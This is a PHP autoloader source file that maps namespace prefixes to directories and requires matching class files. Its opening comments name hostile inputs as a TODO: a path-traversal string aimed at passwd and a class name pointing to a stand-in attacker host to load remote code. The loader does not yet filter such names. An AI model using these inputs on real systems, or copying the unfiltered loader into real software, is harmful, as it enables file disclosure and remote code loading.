<?php
// Todo  :: block namespaces that start with a period ( .hidden, ../../../passwd  ftp://foo )
// User code :    $className = "http://hackerwebserver.com/malicious\script"; new $className;

	spl_autoload_register(function($fullClassName){


		if (!isset($_SERVER["novae-autoload-prefix-map"]))
		{
			$_SERVER["novae-autoload-prefix-map"] = [
				// test\\subnamespace => path
				"novae"=> __DIR__,//( $_SERVER["NOVAE_LIB_DIR"] ? $_SERVER["NOVAE_LIB_DIR"] : getcwd() ),

//				"novae\\common\\interfaces" => __DIR__.DIRECTORY_SEPARATOR."/moduleLoader/common/interfaces",

			];

		}

		$prefixMap = $_SERVER["novae-autoload-prefix-map"];

		if ($fullClassName[0] == "\\")
			$fullClassName = substr($fullClassName, 1);

		$nameArray = explode("\\", $fullClassName);
		$len = count($nameArray);
		$className = $nameArray[ $len - 1 ];
		$prefixPathsFound = []; // Store in here, paths to check, after finding all valid prefixes that match this fullClassName's prefix
		$prefixPathsFoundPrefixLength = 0; // How many namespace separators are in the prefix?    So that a more specific prefix always takes precedence over a less specific one.

		foreach($prefixMap as $thisPrefix => $pathForPrefix)
		{
			$found = FALSE;
			$thisPrefixArray = explode("\\", $thisPrefix);

			$prefixLength = count($thisPrefixArray);
			if ($prefixLength < $prefixPathsFoundPrefixLength) // If we've already found a more specific prefix than this could represent, continue
				continue;

			$found = TRUE;
			foreach($thisPrefixArray as $currentPrefixIndex => $currentPrefix)
			{
				if ($nameArray[$currentPrefixIndex] != $currentPrefix)
				{
					$found = FALSE;
					break;
				}
			}

			if ($found)
			{
				$remainder = $nameArray;
				array_splice($remainder, 0, $currentPrefixIndex+1);

				if ($prefixLength > $prefixPathsFoundPrefixLength)
				{
					$prefixPathsFound = [];
					$prefixPathsFoundPrefixLength = $prefixLength;

				}

				$prefixPathsFound[$pathForPrefix] = $remainder;
			}
		}


		if (!$prefixPathsFound)
		{
//			echo "WARNING::: ".$fullClassName." requested, prefix not located\n";
			return;
		}

//		echo "DEBUG BREAK::: ".$fullClassName." requested, found prefix paths: ";
//		var_export($prefixPathsFound);

		foreach($prefixPathsFound as $prefixDir => $remainderArray)
		{
			$testFile = $prefixDir . DIRECTORY_SEPARATOR . implode(DIRECTORY_SEPARATOR, $remainderArray).".php";
			echo " \nTest file location: ".$testFile. "\n";
			if (file_exists($testFile))
			{
				require_once($testFile);
				return;
			}
		}


		return;
	});
